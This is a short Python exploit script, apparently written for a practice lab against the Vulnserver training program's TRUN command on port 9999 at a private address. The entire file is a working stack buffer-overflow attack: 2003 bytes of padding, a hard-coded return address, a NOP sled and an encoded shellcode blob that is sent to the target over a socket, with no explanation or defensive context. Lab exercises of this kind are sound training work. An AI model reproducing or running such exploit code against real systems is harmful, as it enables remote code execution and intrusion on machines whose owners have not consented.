#!/usr/bin/python3
import sys
import socket

target_ip = "192.168.57.13"
target_port = 9999
cmd_attacking = 'TRUN /.:/'

overflow = (
        b"\xdd\xc5\xd9\x74\x24\xf4\x58\xbe\x6c\xac\xc6\xcc\x31\xc9"
        b"\xb1\x52\x31\x70\x17\x03\x70\x17\x83\x84\x50\x24\x39\xa8"
        b"\x41\x2b\xc2\x50\x92\x4c\x4a\xb5\xa3\x4c\x28\xbe\x94\x7c"
        b"\x3a\x92\x18\xf6\x6e\x06\xaa\x7a\xa7\x29\x1b\x30\x91\x04"
        b"\x9c\x69\xe1\x07\x1e\x70\x36\xe7\x1f\xbb\x4b\xe6\x58\xa6"
        b"\xa6\xba\x31\xac\x15\x2a\x35\xf8\xa5\xc1\x05\xec\xad\x36"
        b"\xdd\x0f\x9f\xe9\x55\x56\x3f\x08\xb9\xe2\x76\x12\xde\xcf"
        b"\xc1\xa9\x14\xbb\xd3\x7b\x65\x44\x7f\x42\x49\xb7\x81\x83"
        b"\x6e\x28\xf4\xfd\x8c\xd5\x0f\x3a\xee\x01\x85\xd8\x48\xc1"
        b"\x3d\x04\x68\x06\xdb\xcf\x66\xe3\xaf\x97\x6a\xf2\x7c\xac"
        b"\x97\x7f\x83\x62\x1e\x3b\xa0\xa6\x7a\x9f\xc9\xff\x26\x4e"
        b"\xf5\x1f\x89\x2f\x53\x54\x24\x3b\xee\x37\x21\x88\xc3\xc7"
        b"\xb1\x86\x54\xb4\x83\x09\xcf\x52\xa8\xc2\xc9\xa5\xcf\xf8"
        b"\xae\x39\x2e\x03\xcf\x10\xf5\x57\x9f\x0a\xdc\xd7\x74\xca"
        b"\xe1\x0d\xda\x9a\x4d\xfe\x9b\x4a\x2e\xae\x73\x80\xa1\x91"
        b"\x64\xab\x6b\xba\x0f\x56\xfc\x05\x67\x61\xfa\xed\x7a\x91"
        b"\x1d\x7e\xf3\x77\x4b\x6e\x52\x20\xe4\x17\xff\xba\x95\xd8"
        b"\xd5\xc7\x96\x53\xda\x38\x58\x94\x97\x2a\x0d\x54\xe2\x10"
        b"\x98\x6b\xd8\x3c\x46\xf9\x87\xbc\x01\xe2\x1f\xeb\x46\xd4"
        b"\x69\x79\x7b\x4f\xc0\x9f\x86\x09\x2b\x1b\x5d\xea\xb2\xa2"
        b"\x10\x56\x91\xb4\xec\x57\x9d\xe0\xa0\x01\x4b\x5e\x07\xf8"
        b"\x3d\x08\xd1\x57\x94\xdc\xa4\x9b\x27\x9a\xa8\xf1\xd1\x42"
        b"\x18\xac\xa7\x7d\x95\x38\x20\x06\xcb\xd8\xcf\xdd\x4f\xf8"
        b"\x2d\xf7\xa5\x91\xeb\x92\x07\xfc\x0b\x49\x4b\xf9\x8f\x7b"
        b"\x34\xfe\x90\x0e\x31\xba\x16\xe3\x4b\xd3\xf2\x03\xff\xd4"
        b"\xd6"
    )

# example for address 0x625011af == "\xaf\x11\x50\x62"
shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 16 + overflow

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    payload = bytes(cmd_attacking, encoding='utf-8') + shellcode
    s.send(payload)
    s.close()
except:
    print ("Error connecting to server")
    sys.exit()
